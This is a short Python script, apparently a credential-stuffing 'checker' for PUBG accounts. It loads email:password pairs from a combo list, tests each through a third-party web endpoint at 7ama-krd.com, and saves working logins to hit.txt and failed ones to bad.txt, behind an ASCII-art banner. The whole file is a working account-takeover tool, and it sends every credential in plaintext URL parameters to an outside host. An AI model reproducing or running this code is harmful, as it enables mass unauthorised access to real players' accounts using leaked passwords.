# -*- coding: utf-8 -*-

import os, sys
import requests
import os
import time


#This tool by @Diablo.Dz in Github only
def login(email, pwd):
  url = "https://7ama-krd.com/api/pubg-xr/index.php?e="+email+"&p="+pwd
  teq = requests.get(url)
  if '"msg":"Params Email is other format!"' in teq.text:
    return "Bad"
  elif '"msg":"Params Email Format is Error!"' in teq.text:
    return "Bad"
  elif '"msg":"the account does not exists!"' in teq.text:
    return "Bad"
  elif '"msg":"wrong password!"' in teq.text:
    return "Bad"
  elif '"token":"' in teq.text:
    return "Hit"
  else:
    return "Error"
def logo():
  banner = """\x1b[31;1m
         PUBG CHECKER BY DIABLODZ
 ███████▓█████▓▓╬╬╬╬╬╬╬╬▓███▓╬╬╬╬╬╬╬▓╬╬▓█
████▓▓▓▓╬╬▓█████╬╬╬╬╬╬███▓╬╬╬╬╬╬╬╬╬╬╬╬╬█
███▓▓▓▓╬╬╬╬╬╬▓██╬╬╬╬╬╬▓▓╬╬╬╬╬╬╬╬╬╬╬╬╬╬▓█
████▓▓▓╬╬╬╬╬╬╬▓█▓╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬▓█
███▓█▓███████▓▓███▓╬╬╬╬╬╬▓███████▓╬╬╬╬▓█
████████████████▓█▓╬╬╬╬╬▓▓▓▓▓▓▓▓╬╬╬╬╬╬╬█
███▓▓▓▓▓▓▓▓▓▓▓▓▓▓█▓╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬▓█
████▓▓▓▓▓▓▓▓▓▓▓▓▓█▓╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬▓█
███▓█▓▓▓▓▓▓▓▓▓▓▓▓▓▓╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬▓█
█████▓▓▓▓▓▓▓▓█▓▓▓█▓╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬▓█
█████▓▓▓▓▓▓▓██▓▓▓█▓╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬██
█████▓▓▓▓▓████▓▓▓█▓╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬██
████▓█▓▓▓▓██▓▓▓▓██╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬██
████▓▓███▓▓▓▓▓▓▓██▓╬╬╬╬╬╬╬╬╬╬╬╬█▓╬▓╬╬▓██
█████▓███▓▓▓▓▓▓▓▓████▓▓╬╬╬╬╬╬╬█▓╬╬╬╬╬▓██
█████▓▓█▓███▓▓▓████╬▓█▓▓╬╬╬▓▓█▓╬╬╬╬╬╬███
██████▓██▓███████▓╬╬╬▓▓╬▓▓██▓╬╬╬╬╬╬╬▓███
███████▓██▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓╬╬╬╬╬╬╬╬╬╬╬████
███████▓▓██▓▓▓▓▓╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬▓████
████████▓▓▓█████▓▓╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬▓█████
█████████▓▓▓█▓▓▓▓▓███▓╬╬╬╬╬╬╬╬╬╬╬▓██████
██████████▓▓▓█▓▓▓▓▓██╬╬╬╬╬╬╬╬╬╬╬▓███████
███████████▓▓█▓▓▓▓███▓╬╬╬╬╬╬╬╬╬▓████████
██████████████▓▓▓███▓▓╬╬╬╬╬╬╬╬██████████
███████████████▓▓▓██▓▓╬╬╬╬╬╬▓███████████



\x1b[37;1m----------------------------------------\x1b[0m  """
  print(banner)
def check(file):
  combo = open(file, "r").readlines()
  count = 0
  for i in combo:
    count += 1
  print("\x1b[37;1m[ \x1b[31;1m{c}\x1b[37;1m ] Email:Pass Loaded".format(c=str(count)))
  bad = 0
  ok = 0
  for ep in combo:
    data = ep.strip().split(":")
    email = data[0]
    pwd = data[1]
    log = login(email, pwd)
    if log == "Bad":
      print("\x1b[37;1m[ \x1b[31;1mBAD \x1b[37;1m]"+email+"|"+pwd)
      open("bad.txt", "a+").write(email+":"+pwd+"\n")
      bad += 1
    elif log == "Hit":
      print("\x1b[37;1m[ \x1b[32;1mHIT \x1b[37;1m] "+email+"|"+pwd)
      open("hit.txt", "a+").write(email+":"+pwd+"\n")
      ok += 1
    else:
      print("\x1b[37;1m[ \x1b[31;1mERROR \x1b[37;1m][{e}][{p}]".format(e=email,p=pwd))
    time.sleep(2)
  print("\x1b[37;1m---------------------")
  print("\x1b[32;1mHit : "+str(ok))
  print("\x1b[31;1mBad : "+str(bad))
  input('')
  exit()
def main():
  file = 'list.txt'
  check(file)


logo()
main()
